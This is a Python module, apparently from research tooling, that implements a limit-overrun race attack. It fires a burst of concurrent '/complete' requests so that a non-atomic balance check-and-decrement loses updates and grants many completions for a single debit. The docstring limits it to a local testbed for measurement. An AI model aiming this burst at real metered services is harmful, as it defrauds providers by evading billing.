"""Class 6 attack: limit-overrun race on credit decrement (KNOWN BASELINE).

NOT a contribution. Implemented to validate the measurement rig end-to-end. Prior
art: Kettle's "Smashing the state machine: the true potential of web race
conditions" (PortSwigger Research, 2023), which introduces the single-packet attack (
a non-atomic ``GET``-then-``DECR`` quota check/decrement race).

Attack idea: an account whose balance covers exactly ``affordable`` requests fires
a burst of ``concurrency`` identical `/complete` calls at once. Against the
vulnerable read-modify-write credit path, all requests read the same balance before
any of them writes; their decrements overwrite one another (lost update), and the
client receives many completions while only a single debit survives.

Each request carries a client-generated ``request_id`` so client-side timing can be
joined to the server-side ledger row, and a ``trial_id`` so the burst is grouped
into one auditable experiment repetition.

ETHICS: targets only the locally-built testbed gateway (default
``http://localhost:8000``). Never point it at any third-party/live/production system.
"""

from __future__ import annotations

import asyncio
import time
import uuid
from dataclasses import dataclass, field

import httpx


@dataclass
class RequestResult:
    request_id: str
    status: int
    latency_s: float
    # Server-reported per-request accounting (present only on HTTP 200).
    cost: str | None = None
    balance_before: str | None = None
    balance_after: str | None = None
    applied_debit: str | None = None
    completion_tokens: int | None = None


@dataclass
class BurstResult:
    served: int
    rejected: int
    errors: int
    results: list[RequestResult] = field(default_factory=list)


async def _fire_one(
    client: httpx.AsyncClient,
    api_key: str,
    prompt: str,
    seed: int,
    trial_id: str,
    concurrency: int,
) -> RequestResult:
    request_id = uuid.uuid4().hex
    payload = {
        "prompt": prompt,
        "seed": seed,
        "request_id": request_id,
        "trial_id": trial_id,
        "concurrency": concurrency,
    }
    start = time.perf_counter()
    try:
        resp = await client.post("/complete", headers={"X-API-Key": api_key}, json=payload)
    except httpx.HTTPError:
        return RequestResult(request_id=request_id, status=-1, latency_s=time.perf_counter() - start)
    elapsed = time.perf_counter() - start

    result = RequestResult(request_id=request_id, status=resp.status_code, latency_s=elapsed)
    if resp.status_code == 200:
        try:
            body = resp.json()
            result.cost = str(body["cost"])
            result.balance_before = str(body["balance_before"])
            result.balance_after = str(body["balance_after"])
            result.applied_debit = str(body["applied_debit"])
            result.completion_tokens = int(body["completion_tokens"])
        except Exception:  # noqa: BLE001
            pass
    return result


async def run_burst(
    client: httpx.AsyncClient,
    api_key: str,
    prompt: str,
    seed: int,
    trial_id: str,
    concurrency: int,
) -> BurstResult:
    """Fire ``concurrency`` identical completions as simultaneously as possible."""
    tasks = [
        asyncio.create_task(_fire_one(client, api_key, prompt, seed, trial_id, concurrency))
        for _ in range(concurrency)
    ]
    results = await asyncio.gather(*tasks)
    served = sum(1 for r in results if r.status == 200)
    rejected = sum(1 for r in results if r.status == 402)
    errors = sum(1 for r in results if r.status not in (200, 402))
    return BurstResult(served=served, rejected=rejected, errors=errors, results=list(results))
